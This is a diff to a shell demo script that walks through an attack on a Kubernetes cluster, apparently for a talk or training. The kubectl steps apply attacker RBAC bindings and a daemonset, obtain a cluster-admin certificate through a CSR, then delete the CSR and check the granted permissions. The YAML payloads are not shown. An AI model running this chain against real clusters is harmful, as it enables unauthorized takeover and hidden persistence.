@@ -47,7 +47,6 @@ gcloud container clusters get-credentials $VULN_CLUSTER_NAME \
 clear
 
 echo ""
-
 echo ""
 
 DEMO_PROMPT="customer-cluster $ "
@@ -62,35 +61,44 @@ pe "kubectl apply -f customer_binding.yaml"
 echo ""
 echo ""
 
-wait
+pe "clear"
 
-clear
+echo ""
+echo ""
 
 DEMO_PROMPT="attacker-machine $ "
 
-echo "scanning..."
-echo "scanning..."
-echo "scanning..."
+p "scan_vulnerable_clusters.py"
 
-wait
-
+echo "scanning..."
+sleep 2
+echo "scanning..."
+sleep 2
+echo "scanning..."
+sleep 2
 echo "target found!"
 
 wait
 
 clear
 
+echo ""
+echo ""
+
 pe "cat attacker_foothold_binding.yaml"
 
 echo ""
 echo ""
-
 
 pe "kubectl apply -f attacker_foothold_binding.yaml"
 
 echo ""
 echo ""
 
+pe clear
+
+echo ""
+echo ""
 
 p "cat attacker_foothold_daemonset.yaml"
 
@@ -104,9 +112,10 @@ pe "kubectl apply -f attacker_foothold_daemonset.yaml"
 echo ""
 echo ""
 
-wait
+pe "clear"
 
-clear
+echo ""
+echo ""
 
 DEMO_PROMPT="kube-controller-daemonset $ "
 
@@ -123,12 +132,17 @@ pe "cat attacker_persistence_csr.yaml"
 echo ""
 echo ""
 
+pe "clear"
+
+echo ""
+echo ""
+
+pe "cat attacker_persistence_csr.yaml | yq -r .spec.request | base64 -d | openssl req -subject -noout"
+
+echo ""
+echo ""
+
 pe "kubectl apply -f attacker_persistence_csr.yaml"
-
-echo ""
-echo ""
-
-pe "kubectl get csr cluster-admin -o jsonpath='{.spec.request}' | base64 -d | openssl req -subject -noout"
 
 echo ""
 echo ""
@@ -149,6 +163,16 @@ kubectl get csr cluster-admin -o jsonpath='{.status.certificate}' | base64 -d > 
 echo ""
 echo ""
 
+pe "kubectl delete csr cluster-admin"
+
+echo ""
+echo ""
+
+pe "clear"
+
+echo ""
+echo ""
+
 pe "cat attacker_persistence_binding.yaml"
 
 echo ""
@@ -159,15 +183,24 @@ pe "kubectl apply -f attacker_persistence_binding.yaml"
 echo ""
 echo ""
 
-wait
+pe "clear"
 
-clear
+echo ""
+echo ""
 
 DEMO_PROMPT="attacker-machine $ "
 
 pe "kubectl auth can-i --list --client-key csr.key --client-certificate csr.crt"
 
-wait
+echo ""
+echo ""
+
+pe "clear"
+
+echo ""
+echo ""
+
+pe "kubectl apply -f attacker_daemonset_update.yaml"
 
 ### Cleanup ###
 
